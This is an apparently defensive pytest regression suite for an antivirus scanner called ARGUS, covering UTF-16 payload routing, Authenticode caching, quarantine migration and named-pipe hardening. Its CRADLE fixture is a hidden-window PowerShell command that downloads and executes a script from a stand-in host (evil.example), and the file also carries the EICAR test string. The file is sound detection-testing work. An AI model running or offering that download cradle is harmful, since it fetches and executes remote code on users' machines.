"""Fix round 3 regression tests (ARGUS.EXE v1.1.0, unreleased).

Names carry the round-3 item ids:
- BLOCKER — UTF-16 routing blind zone (P0-4 lineage, third
  strike): routing is now placement-independent. The scanner
  tests EVERY chunk of its streaming pass for a UTF-16 segment
  and runs a bounded folded second pass on any positive;
  heuristic routing streams the whole file, and the script
  decoder reads windows around located passages beyond its
  head cap.
- P2-1 — pipe squatting: FILE_FLAG_FIRST_PIPE_INSTANCE; a
  taken name means the listener logs loudly and does not serve.
- P2-2 — pipe session DoS: sessions run on their own threads
  under a watchdog read/session timeout.
- P2-3 — migration binding: an imported legacy row's path must
  be the bound vault entry's own original path.
- P2-4 — Authenticode verdict cache key carries a sampled
  content component (timestomp-proof).
- P2-5 — benign mixed-encoding documents: script signals are
  computed segment-aware; prose is not a payload line.
- P2-6 — self-check census covers the pipe/Authenticode/GUI
  first-run modules; the Qt check constructs the wizard.
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import random
import sys
import threading
import time
import types
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from argus import entry as entry_mod  # noqa: E402
from argus import pipe_channel  # noqa: E402
from argus.actions import ActionEngine  # noqa: E402
from argus.config import ArgusConfig  # noqa: E402
from argus.detections import Verdict  # noqa: E402
from argus.heuristics.analyze import (  # noqa: E402
    _U16_SEGMENT_RE,
    _u16le_segment_offset,
)
from argus.heuristics.signals import script_signals  # noqa: E402
from argus.quarantine import Vault  # noqa: E402
from argus.rules import BUILTIN_RULES  # noqa: E402
from argus.scanner import CHUNK_SIZE, scan_file  # noqa: E402
from argus.service import ArgusService  # noqa: E402
from argus.signatures import SignatureDB, init_db  # noqa: E402

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

CRADLE = (
    "powershell -nop -w hidden -c \"IEX (New-Object "
    "Net.WebClient).DownloadString('http://evil.example/payload.ps1')\""
)
CRADLE_U16 = CRADLE.encode("utf-16-le")


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    database = SignatureDB.open(path)
    yield database
    database.close()


# ======================================================================
# BLOCKER — placement-independent UTF-16 routing
# ======================================================================
def test_fixround3_blocker_cradle_at_2mib_in_8mib_txt(db, tmp_path):
    """The re-audit's demonstrated placement #1: the cradle sits
    BETWEEN the old sampler's windows (head/middle/tail) — it
    scored Clean 0. Now the per-chunk segment test sees it and
    the folded second pass + heuristic decode convict it."""
    target = tmp_path / "parked.txt"
    target.write_bytes(
        b"A" * (2 * 1024 * 1024) + CRADLE_U16 + b"A" * (6 * 1024 * 1024)
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert any(
        d.name == "Suspicious_PowerShell_Download"
        for d in scanned.assessment.detections
    )
    assert "powershell_download_cradle" in {
        s.name for s in scanned.assessment.signals
    }


def test_fixround3_blocker_cradle_at_6mib_in_32mib_txt(db, tmp_path):
    """The re-audit's demonstrated placement #2 — deeper, and
    past the script decode's 4 MiB head cap, so the heuristic
    leg must read the window the routing scan located."""
    target = tmp_path / "parked-deep.txt"
    target.write_bytes(
        b"B" * (6 * 1024 * 1024) + CRADLE_U16 + b"B" * (26 * 1024 * 1024)
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert any(
        d.name == "Suspicious_PowerShell_Download"
        for d in scanned.assessment.detections
    )
    assert "powershell_download_cradle" in {
        s.name for s in scanned.assessment.signals
    }


def test_fixround3_blocker_cradle_random_offset_in_5mib_dat(db, tmp_path):
    """An odd, unremarkable offset in a non-script extension —
    no sampled window, no parity, no extension luck involved."""
    offset = 4_500_123
    target = tmp_path / "payload.dat"
    target.write_bytes(
        b"D" * offset + CRADLE_U16 + b"D" * (5 * 1024 * 1024 - offset)
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS


def test_fixround3_blocker_cradle_split_parity_at_chunk_boundary(
    db, tmp_path
):
    """The cradle starts at an ODD offset nine bytes before the
    scanner's 1 MiB chunk boundary: it straddles two chunks AND
    sits on the odd parity — the per-chunk test's carry and the
    second pass's odd folded view are both exercised."""
    start = CHUNK_SIZE - 9
    assert start % 2 == 1
    target = tmp_path / "straddle.txt"
    target.write_bytes(b"C" * start + CRADLE_U16 + b"C" * 500_000)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert "powershell_download_cradle" in {
        s.name for s in scanned.assessment.signals
    }


def test_fixround3_blocker_second_pass_runs_once_on_positive(
    db, tmp_path, monkeypatch
):
    """A positive segment test triggers exactly one folded
    second pass — the machinery is armed by evidence, not run
    speculatively."""
    import argus.scanner as scanner_mod

    calls = []
    real = scanner_mod._folded_second_pass

    def _spy(*args, **kwargs):
        calls.append(1)
        return real(*args, **kwargs)

    monkeypatch.setattr(scanner_mod, "_folded_second_pass", _spy)
    target = tmp_path / "parked.txt"
    # The 8 MiB geometry of the first blocker test: the cradle
    # sits outside every sampled window, so the main pass starts
    # WITHOUT folded views and only the per-chunk test can arm
    # the second pass.
    target.write_bytes(
        b"A" * (2 * 1024 * 1024) + CRADLE_U16 + b"A" * (6 * 1024 * 1024)
    )
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert calls == [1]


def test_fixround3_blocker_benign_large_text_stays_single_pass(
    db, tmp_path, monkeypatch
):
    """A large benign text file never tests positive, so it
    costs ONE pass — no second pass is run for it — and it
    stays Clean."""
    import argus.scanner as scanner_mod

    calls = []

    def _spy(*args, **kwargs):
        calls.append(1)
        return None, None

    monkeypatch.setattr(scanner_mod, "_folded_second_pass", _spy)
    prose = b"The ferry crosses at dawn and the manifest is long. "
    target = tmp_path / "big-benign.txt"
    target.write_bytes(prose * (10 * 1024 * 1024 // len(prose)))
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.CLEAN
    assert calls == []


def test_fixround3_u16_segment_offset_matches_pair_regex():
    """Differential pin: the fast parity-lane segment test must
    agree with the pair regex (:data:`_U16_SEGMENT_RE`) — same
    first-segment offset — on crafted and planted buffers."""
    rng = random.Random(0xFE33)
    for trial in range(1500):
        size = rng.randint(0, 400)
        buf = bytearray(rng.getrandbits(8) for _ in range(size))
        if size > 90 and rng.random() < 0.75:
            start = rng.randint(0, size - 80)
            pairs = rng.randint(8, 40)
            planted = ("K" * pairs).encode("utf-16-le")[: pairs * 2]
            buf[start : start + len(planted)] = planted
        data = bytes(buf)
        spans = [
            (m.start(), m.end()) for m in _U16_SEGMENT_RE.finditer(data)
        ]
        got = _u16le_segment_offset(data)
        if spans:
            assert got == spans[0][0], (trial, spans[:1], got)
        else:
            assert got is None, (trial, got)


# ======================================================================
# P2-5 — benign mixed-encoding documents
# ======================================================================
def test_fixround3_p2_mixed_prose_document_is_clean(db, tmp_path):
    """The re-audit's false positive: ASCII prose + a UTF-16LE
    prose paragraph in one .txt scored Suspicious 25 — the
    decoded paragraph was judged as one giant 'line'. Prose is
    not a payload line; the document is Clean."""
    ascii_prose = (
        b"The team reviewed the quarterly numbers and all was fine.\n"
        * 60
    )
    u16_prose = (
        "The ferry schedule was posted near the office door. " * 40
    ).encode("utf-16-le")
    target = tmp_path / "mixed.txt"
    target.write_bytes(ascii_prose + u16_prose)
    scanned = scan_file(target, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.CLEAN
    assert "very_long_script_line" not in {
        s.name for s in scanned.assessment.signals
    }


def test_fixround3_p2_unbroken_blob_line_still_flagged():
    """The payload shape the signal exists for still trips it:
    one giant whitespace-free run. Spaced prose of the same
    length does not."""
    blob = "echo start\n" + "A" * 5000 + "\necho end\n"
    assert "very_long_script_line" in {
        s.name for s in script_signals(blob, "a.cmd")
    }
    prose = ("The ferry schedule was posted near the office door. " * 60)
    assert "very_long_script_line" not in {
        s.name for s in script_signals(prose, "a.txt")
    }


# ======================================================================
# P2-4 — Authenticode cache is content-keyed
# ======================================================================
def test_fixround3_p2_authenticode_cache_rechecks_timestomped_swap(
    tmp_path, monkeypatch
):
    """A same-size replacement with a restored mtime must NOT
    inherit the previous file's cached verdict — the cache key
    carries a sampled content hash, so the swap re-verifies.
    An untouched file still hits the cache."""
    import argus.platform_authenticode as pac

    calls = []

    def _fake_verify(target):
        calls.append(1)
        return pac.AuthenticodeResult(pac.STATUS_VERIFIED, 0, "fake")

    monkeypatch.setattr(pac, "_verify_authenticode_uncached", _fake_verify)
    pac.clear_cache()

    target = tmp_path / "system.dll"
    target.write_bytes(b"A" * 1000)
    first = pac.verify_authenticode(target)
    assert first.status == pac.STATUS_VERIFIED
    assert len(calls) == 1

    # Untouched: served from the cache.
    pac.verify_authenticode(target)
    assert len(calls) == 1

    # The timestomp: same size, different bytes, mtime restored.
    stat = target.stat()
    target.write_bytes(b"B" * 1000)
    os.utime(target, ns=(stat.st_atime_ns, stat.st_mtime_ns))
    assert target.stat().st_size == stat.st_size
    assert target.stat().st_mtime_ns == stat.st_mtime_ns
    pac.verify_authenticode(target)
    assert len(calls) == 2  # re-verified — no inherited trust


# ======================================================================
# P2-6 — self-check census + Qt wizard construction
# ======================================================================
def test_fixround3_p2_self_check_census_covers_channel_and_first_run():
    for name in (
        "argus.pipe_channel",
        "argus.platform_authenticode",
        "argus.gui.app",
        "argus.gui.onboarding",
    ):
        assert name in entry_mod.SELF_CHECK_MODULES
    imported = []
    rc = entry_mod.run_self_check(
        import_module=lambda name: imported.append(name)
    )
    assert rc == 0
    for name in (
        "argus.pipe_channel",
        "argus.platform_authenticode",
        "argus.gui.app",
        "argus.gui.onboarding",
    ):
        assert name in imported


def test_fixround3_p2_self_check_qt_constructs_onboarding_wizard(
    tmp_path, monkeypatch
):
    """The first-run path is part of the release smoke: the Qt
    check must CONSTRUCT the onboarding wizard, not only the
    main window."""
    pytest.importorskip("PySide6")
    monkeypatch.setenv("QT_QPA_PLATFORM", "offscreen")
    monkeypatch.setenv("ARGUS_DATA_DIR", str(tmp_path))

    import argus.gui.onboarding as onboarding

    constructed = []
    real_wizard = onboarding.OnboardingWizard

    class _CountingWizard(real_wizard):
        def __init__(self, *args, **kwargs):
            constructed.append(1)
            super().__init__(*args, **kwargs)

    monkeypatch.setattr(onboarding, "OnboardingWizard", _CountingWizard)
    assert entry_mod.run_self_check_qt() == 0
    assert constructed, "the Qt self-check never built the wizard"


# ======================================================================
# P2-3 — migration rows must name the entry's own path
# ======================================================================
@pytest.fixture()
def svc_env(tmp_path, monkeypatch):
    """A service wired to a real vault (mirrors the round-2
    fixture): just what the migration pass needs."""
    shared = tmp_path / "shared"
    (shared / "requests").mkdir(parents=True)
    (shared / "results").mkdir(parents=True)
    config = ArgusConfig(status_file=str(tmp_path / "status.json"))
    vault = Vault.open(
        tmp_path / "vault", tmp_path / "trusted" / "pending.db"
    )
    engine = ActionEngine(vault, config, config_path=tmp_path / "cfg.json")
    svc = ArgusService(config=config)
    svc.vault = vault
    svc.actions = engine
    svc.state = "running"
    yield {"svc": svc, "vault": vault, "root": tmp_path}
    vault.close()


def _legacy_vault(tmp_path, name="legacy"):
    legacy = tmp_path / name / "pending.db"
    return Vault.open(tmp_path / f"{name}-vault", legacy), legacy


def test_fixround3_p2_migration_row_with_foreign_path_dropped(
    svc_env, monkeypatch, tmp_path
):
    """A row bound to a REAL entry with the RIGHT fingerprint
    but naming an ARBITRARY VICTIM path: provenance covered
    (entry, sha) after round 2, yet the queue item was
    fabricated. Round 3 binds the path too — the row is
    dropped and counted, the victim untouched."""
    vault = svc_env["vault"]
    anchor_target = tmp_path / "anchor.exe"
    anchor_target.write_bytes(EICAR)
    entry = vault.quarantine_file(anchor_target, detection_name="Anchor")
    victim = tmp_path / "victim.txt"
    victim.write_bytes(b"important document")
    lv, legacy = _legacy_vault(tmp_path)
    try:
        row = lv.add_pending(
            source="realtime", path=victim, action="delete",
            sha256=_sha(EICAR), detection_name="Fabricated.Detection",
        )
        lv.update_pending(row.id, status="pending", entry_id=entry.id)
        rid = row.id
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc_env["svc"]._migrate_legacy_pending(vault)
    assert vault.get_pending(rid) is None
    assert svc_env["svc"]._legacy_pending_dropped == 1
    assert victim.read_bytes() == b"important document"


def test_fixround3_p2_migration_row_with_entry_path_still_migrates(
    svc_env, monkeypatch, tmp_path
):
    """Control: the genuine row — bound entry, matching
    content, and the path spelled as the entry's own (with a
    harmless '/./' spelling wobble the binding normalises) —
    still migrates."""
    vault = svc_env["vault"]
    anchor_target = tmp_path / "anchor.exe"
    anchor_target.write_bytes(EICAR)
    entry = vault.quarantine_file(anchor_target, detection_name="Anchor")
    spelled = str(tmp_path) + "/./" + anchor_target.name
    lv, legacy = _legacy_vault(tmp_path)
    try:
        row = lv.add_pending(
            source="realtime", path=spelled, action="quarantine",
            sha256=_sha(EICAR),
        )
        lv.update_pending(row.id, status="pending", entry_id=entry.id)
        rid = row.id
    finally:
        lv.close()
    monkeypatch.setattr(
        "argus.service.legacy_shared_pending_db", lambda: legacy
    )
    svc_env["svc"]._migrate_legacy_pending(vault)
    assert vault.get_pending(rid) is not None
    assert svc_env["svc"]._legacy_pending_dropped == 0


# ======================================================================
# P2-1 / P2-2 — pipe listener: no squatters, no starvation
# ======================================================================
class _FakeWinError(Exception):
    """Stands in for pywintypes.error (carries a winerror)."""

    def __init__(self, winerror, message="fake win32 error"):
        super().__init__(message)
        self.winerror = winerror


class _FakeClient:
    def __init__(self, pid, inbox):
        self.pid = pid
        self.inbox = inbox  # bytes the client sends; None = silent
        self.written: list[bytes] = []


class _FakeHandle:
    def __init__(self):
        self.client: _FakeClient | None = None
        self.closed = False
        self._close_event = threading.Event()

    def close(self):
        self.closed = True
        self._close_event.set()


class _FakeWin32:
    """In-memory pywin32 stand-ins, faithful to the calls
    argus.pipe_channel makes: CreateNamedPipe /
    ConnectNamedPipe / ReadFile / WriteFile / CloseHandle /
    CreateFile (the stop() wake-up) / the SDDL conversion."""

    def __init__(self):
        import queue as _queue

        self.clients = _queue.Queue()
        self.created_modes: list[int] = []
        self.create_error: _FakeWinError | None = None
        self.bound: dict[int, _FakeHandle] = {}
        self.pywintypes = types.ModuleType("pywintypes")
        self.pywintypes.error = _FakeWinError
        self.win32pipe = types.ModuleType("win32pipe")
        self.win32file = types.ModuleType("win32file")
        self.win32security = types.ModuleType("win32security")
        self._wire()

    # -- wiring -------------------------------------------------
    def _wire(self):
        state = self
        pipe = self.win32pipe
        pipe.PIPE_ACCESS_DUPLEX = 0x3
        pipe.PIPE_TYPE_MESSAGE = 0x4
        pipe.PIPE_READMODE_MESSAGE = 0x2
        pipe.PIPE_WAIT = 0x0
        pipe.PIPE_UNLIMITED_INSTANCES = 255
        # Deliberately NO FILE_FLAG_FIRST_PIPE_INSTANCE: the
        # production lookup must fall back to the winbase value.

        def create_named_pipe(name, open_mode, *rest):
            state.created_modes.append(open_mode)
            if state.create_error is not None:
                raise state.create_error
            return _FakeHandle()

        def connect_named_pipe(handle, _overlapped):
            import queue as _queue

            try:
                client = state.clients.get(timeout=5)
            except _queue.Empty:
                raise _FakeWinError(2, "no client arrived")
            handle.client = client
            state.bound[client.pid] = handle

        pipe.CreateNamedPipe = create_named_pipe
        pipe.ConnectNamedPipe = connect_named_pipe
        pipe.DisconnectNamedPipe = lambda handle: None
        pipe.GetNamedPipeClientProcessId = (
            lambda handle: handle.client.pid
        )

        file_mod = self.win32file
        file_mod.GENERIC_READ = 0x80000000
        file_mod.GENERIC_WRITE = 0x40000000
        file_mod.OPEN_EXISTING = 3

        def create_file(*_args):
            # stop()'s throwaway wake-up connection.
            state.clients.put(_FakeClient(pid=-2, inbox=b""))
            return _FakeHandle()

        def read_file(handle, _size):
            client = handle.client
            if client is None:
                raise _FakeWinError(109, "no client bound")
            if client.inbox is not None:
                data, client.inbox = client.inbox, None
                return 0, data
            # A silent client: block until the handle is closed
            # out from under the read (the watchdog's move).
            while not handle.closed:
                handle._close_event.wait(0.02)
            raise _FakeWinError(109, "the pipe was closed")

        def write_file(handle, data):
            handle.client.written.append(bytes(data))
            return 0, len(data)

        file_mod.CreateFile = create_file
        file_mod.ReadFile = read_file
        file_mod.WriteFile = write_file
        file_mod.CloseHandle = lambda handle: handle.close()

        sec = self.win32security
        sec.SDDL_REVISION_1 = 1
        sec.ConvertStringSecurityDescriptorToSecurityDescriptor = (
            lambda sddl, revision: object()
        )

        class _SecurityAttributes:
            SECURITY_DESCRIPTOR = None
            bInheritHandle = False

        sec.SECURITY_ATTRIBUTES = _SecurityAttributes

    # -- test-side helpers ---------------------------------------
    def install(self, monkeypatch):
        monkeypatch.setitem(sys.modules, "pywintypes", self.pywintypes)
        monkeypatch.setitem(sys.modules, "win32pipe", self.win32pipe)
        monkeypatch.setitem(sys.modules, "win32file", self.win32file)
        monkeypatch.setitem(
            sys.modules, "win32security", self.win32security
        )

    def add_client(self, pid, inbox):
        client = _FakeClient(pid, inbox)
        self.clients.put(client)
        return client


def _verified_handler(finished, canonical, recorded):
    identity = pipe_channel.ClientIdentity(
        image_path=canonical, sha256=recorded
    )

    class _Provider(pipe_channel.ClientIdentityProvider):
        def identify(self, pid):
            return identity

    def handler(stream, pid):
        try:
            return pipe_channel.serve_pipe_stream(
                stream,
                client_pid=pid,
                identity_provider=_Provider(),
                canonical_exe=canonical,
                recorded_sha256=recorded,
                execute=lambda req: {
                    "ok": True,
                    "id": req.get("id"),
                    "nonce": req.get("nonce"),
                },
            )
        finally:
            finished.append(pid)

    return handler


def test_fixround3_p2_pipe_name_taken_refuses_to_serve(
    monkeypatch, caplog
):
    """Squatting defence: with FIRST_PIPE_INSTANCE set, a name
    that is already owned makes CreateNamedPipe fail with
    ERROR_ACCESS_DENIED — the listener logs loudly, marks
    name_taken, and serves NOTHING (protection is unaffected,
    but the impostor does not get the service's silence)."""
    fake = _FakeWin32()
    fake.create_error = _FakeWinError(5, "access is denied")
    fake.install(monkeypatch)
    calls = []
    server = pipe_channel.WindowsPipeServer(
        lambda stream, pid: calls.append(pid)
    )
    with caplog.at_level(logging.DEBUG, logger="argus.pipe_channel"):
        server.start()
        thread = server._thread
        thread.join(timeout=5)
    try:
        assert not thread.is_alive()
        assert server.name_taken is True
        assert calls == []
        # The create carried FILE_FLAG_FIRST_PIPE_INSTANCE
        # (0x00080000 — the literal fallback, since the fake
        # modules deliberately define no such constant).
        assert fake.created_modes
        assert fake.created_modes[0] & 0x00080000
        assert any(
            record.levelno >= logging.ERROR
            and "already owned" in record.getMessage()
            for record in caplog.records
        )
    finally:
        server.stop()


def test_fixround3_p2_pipe_sessions_run_concurrently(monkeypatch):
    """A silent first client must not starve the channel: the
    second client's request is served while the first session
    is still sitting open and mute."""
    fake = _FakeWin32()
    fake.install(monkeypatch)
    canonical = Path(r"C:\Program Files\Sentinel Safeguard\Argus\Argus.exe")
    recorded = "ab" * 32
    finished: list[int] = []
    server = pipe_channel.WindowsPipeServer(
        _verified_handler(finished, canonical, recorded),
        session_timeout=30.0,
    )
    fake.add_client(pid=111, inbox=None)  # connects, says nothing
    talker = fake.add_client(
        pid=222,
        inbox=json.dumps(
            {"id": "r1", "kind": "restore", "nonce": "n1"}
        ).encode(),
    )
    server.start()
    try:
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline and not talker.written:
            time.sleep(0.02)
        assert talker.written, "second client starved behind the first"
        response = json.loads(talker.written[0])
        assert response["ok"] is True
        assert response["nonce"] == "n1"
        # The silent session is still open on its own thread.
        assert 222 in finished
        assert 111 not in finished
        assert fake.bound[111].closed is False
    finally:
        # Release the blocked session thread before stopping.
        handle = fake.bound.get(111)
        if handle is not None:
            handle.close()
        server.stop()


def test_fixround3_p2_pipe_session_timeout_drops_silent_client(
    monkeypatch
):
    """The watchdog: a session that never speaks is dropped
    after the session timeout — its handle closed, its thread
    ended — instead of living for the life of the service."""
    fake = _FakeWin32()
    fake.install(monkeypatch)
    canonical = Path(r"C:\Program Files\Sentinel Safeguard\Argus\Argus.exe")
    recorded = "cd" * 32
    finished: list[int] = []
    server = pipe_channel.WindowsPipeServer(
        _verified_handler(finished, canonical, recorded),
        session_timeout=0.3,
    )
    fake.add_client(pid=111, inbox=None)
    server.start()
    try:
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            handle = fake.bound.get(111)
            if handle is not None and handle.closed:
                break
            time.sleep(0.02)
        handle = fake.bound.get(111)
        assert handle is not None and handle.closed, (
            "the watchdog never dropped the silent session"
        )
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline and 111 not in finished:
            time.sleep(0.02)
        assert 111 in finished  # the session thread ended too
    finally:
        server.stop()
